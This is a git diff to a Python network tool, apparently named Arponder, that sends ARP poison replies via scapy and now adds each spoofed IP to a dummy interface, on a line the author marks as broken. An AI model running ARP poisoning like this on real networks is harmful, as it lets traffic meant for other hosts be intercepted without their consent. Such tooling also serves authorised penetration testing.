@@ -3,13 +3,15 @@ import ipaddress
 import netifaces
 from colorama import Fore
 
+from arponder.dummy_interface import DummyIface
 
 class Arponder():
-    def __init__(self, net_interface: str, analyze_only=False, debug=False):
+    def __init__(self, net_interface: str, dummy_iface, analyze_only=False, debug=False):
         self.net_interface = net_interface
         self.debug = debug
         self.analyze_only = analyze_only
         self.active_hosts = {}
+        self.dummy_iface = dummy_iface
 
         # Parse interface info
         self.interface_mac = get_if_hwaddr(self.net_interface)
@@ -54,6 +56,10 @@ class Arponder():
                             hwdst=requestor_mac
                         )
                         sendp(poison_reply, iface=self.net_interface, verbose=0)
+
+                        # Add IP to dummy iface
+                        self.dummy_iface.add_ip(ip_address=requested_ip)   ### THIS IS BROKEN ###
+
                         print(Fore.LIGHTRED_EX + f"  [+] Sent ARP poison reply to {requestor_ip} for {requested_ip}" + Fore.RESET)
                 else:
                     # ARP Reply (is-at)
